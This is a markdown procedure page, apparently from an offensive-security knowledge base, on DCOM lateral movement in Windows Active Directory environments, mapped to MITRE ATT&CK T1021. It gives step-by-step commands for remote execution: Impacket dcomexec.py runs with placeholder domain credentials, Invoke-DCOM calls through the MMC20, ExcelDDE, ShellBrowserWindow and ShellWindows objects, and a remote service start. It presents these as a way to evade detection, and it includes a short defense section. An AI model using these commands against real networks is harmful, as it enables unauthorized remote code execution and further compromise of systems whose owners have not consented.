---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/DCOM Exploitation]]'
commands:
  - '[[commands/dcomexec-silent-execution]]'
  - '[[commands/dcomexec-command-with-output]]'
  - '[[commands/dcomexec-launch-notepad-debug]]'
  - '[[commands/invoke-dcom-start-calc-mmc20-excel]]'
  - '[[commands/invoke-dcom-start-calc-shell-methods]]'
  - '[[commands/invoke-dcom-start-service]]'
platforms:
  - Windows
tools:
  - '[[tools/Impacket]]'
  - '[[tools/Invoke-DCOM]]'
validated: true
---

# DCOM Lateral Movement

## Summary

This procedure demonstrates how to perform lateral movement in a Windows domain environment using DCOM (Distributed Component Object Model) to execute commands remotely on target machines. It leverages tools like Impacket's dcomexec.py and PowerShell's Invoke-DCOM module to instantiate COM objects and run payloads without relying on traditional protocols like SMB or RDP, helping attackers evade detection in segmented networks.

## Description

DCOM enables inter-process communication across machines via RPC, allowing attackers with valid credentials to execute arbitrary commands on remote Windows systems. This technique is particularly useful in Active Directory environments where DCOM is enabled by default. The procedure covers authentication with domain credentials, object instantiation (e.g., MMC20.Application, ShellWindows), and command execution, either silently or with output retrieval. It targets Windows servers or workstations with DCOM enabled (ports 135 and dynamic RPC ports open). Success grants shell access or process execution on the target, facilitating further compromise like privilege escalation or data exfiltration. This maps to MITRE ATT&CK's Remote Services (T1021) under Lateral Movement.

## Requirements

1. Valid domain credentials (username, password, or hashes) with remote execution privileges on the target (e.g., local admin or domain admin).
2. Network access to the target machine (TCP 135 for RPC endpoint mapper, plus dynamic high ports 49152-65535 for RPC communication).
3. Installed tools: Impacket suite (for dcomexec.py) on a Linux attacker machine, or PowerShell with Invoke-DCOM module on a Windows attacker machine.
4. Target environment: Windows 7+ or Server 2008+ with DCOM enabled (default in domain-joined systems).

## Defense

- Disable unnecessary DCOM objects via registry (e.g., restrict MMC20.Application) and monitor DCOM activation events (Event ID 10016 in System logs).
- Implement network segmentation and firewall rules to block unauthorized RPC traffic (e.g., restrict dynamic ports).
- Enable Windows Defender Application Control (WDAC) or AppLocker to prevent unauthorized binary execution.
- Monitor for anomalous process creation (e.g., calc.exe, notepad.exe) from unexpected parents via Sysmon (Event ID 1) or EDR tools.

## Objectives

1. Achieve remote command execution on a target Windows machine using DCOM.
2. Maintain stealth by avoiding common lateral movement protocols like SMB or WinRM.
3. Retrieve command output or launch interactive shells for further post-exploitation.

## Instructions

### Step 1: Prepare Authentication and Target Connection

**Context**: Authenticate to the target using domain credentials and test basic DCOM connectivity. This step ensures the prerequisites are met before executing commands.

Use [[tools/Impacket]]'s dcomexec.py for Python-based execution. Specify the share (e.g., C$) for file access if needed, and choose an object like MMC20 for instantiation.

**Command** ([[commands/dcomexec-silent-execution]]):
```bash
dcomexec.py -share C$ -object MMC20 'DOMAIN/USERNAME:PASSWORD@TARGET_HOST'
```

> This command instantiates the MMC20.Application object silently without retrieving output, confirming connectivity. Run it first to validate access.

### Step 2: Execute a Command with Output Retrieval

**Context**: Run a diagnostic command like ipconfig to verify execution and retrieve results, confirming DCOM's ability to proxy output back to the attacker.

**Command** ([[commands/dcomexec-command-with-output]]):
```bash
dcomexec.py -share C$ -object MMC20 'DOMAIN/USERNAME:PASSWORD@TARGET_HOST' 'ipconfig'
```

> The command executes ipconfig on the target and displays network configuration output, indicating successful remote execution. Look for target-specific IP details in the response.

### Step 3: Launch a Process in Debug Mode for Testing

**Context**: Test process creation by launching notepad.exe in debug mode to observe behavior without user interaction, useful for verifying non-interactive execution.

**Command** ([[commands/dcomexec-launch-notepad-debug]]):
```bash
python3 dcomexec.py -object MMC20 -silentcommand -debug DOMAIN/USERNAME:PASSWORD@TARGET_HOST 'notepad.exe'
```

> This launches notepad.exe silently with debug output, allowing inspection of DCOM instantiation logs. Success is indicated by debug messages showing object creation without errors.

### Step 4: Use PowerShell Invoke-DCOM for MMC20 and ExcelDDE Methods

**Context**: Switch to PowerShell for native Windows execution, using MMC20.Application and ExcelDDE methods to start calc.exe. This demonstrates alternative COM objects for redundancy.

First, import the Invoke-DCOM module.

**Command** ([[commands/invoke-dcom-start-calc-mmc20-excel]]):
```powershell
Import-Module .\Invoke-DCOM.ps1
Invoke-DCOM -ComputerName TARGET_HOST -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName TARGET_HOST -Method ExcelDDE -Command "calc.exe"
```

> These commands execute calc.exe via two methods. Success is confirmed if the calculator appears on the target (if interactive session) or process is created in task manager.

### Step 5: Execute via ShellBrowserWindow and ShellWindows Methods

**Context**: Use shell-related COM objects for execution, which may bypass restrictions on administrative objects.

**Command** ([[commands/invoke-dcom-start-calc-shell-methods]]):
```powershell
Invoke-DCOM -ComputerName TARGET_HOST -Method ShellBrowserWindow -Command "calc.exe"
Invoke-DCOM -ComputerName TARGET_HOST -Method ShellWindows -Command "calc.exe"
```

> Launches calc.exe using shell objects. Expected: Process starts without errors; check target for running calc.exe.

### Step 6: Start a Custom Service

**Context**: Demonstrate service manipulation for persistence or execution, starting a service named MyService.

**Command** ([[commands/invoke-dcom-start-service]]):
```powershell
Invoke-DCOM -ComputerName TARGET_HOST -Method ServiceStart "MyService"
```

> Starts the MyService service remotely. Success: Service status changes to running in services.msc on target.

## Expected Output

Successful execution typically shows no errors in tool output, with command results (if not silent) displaying target-specific data like IP configs or debug logs confirming object instantiation and process launch.
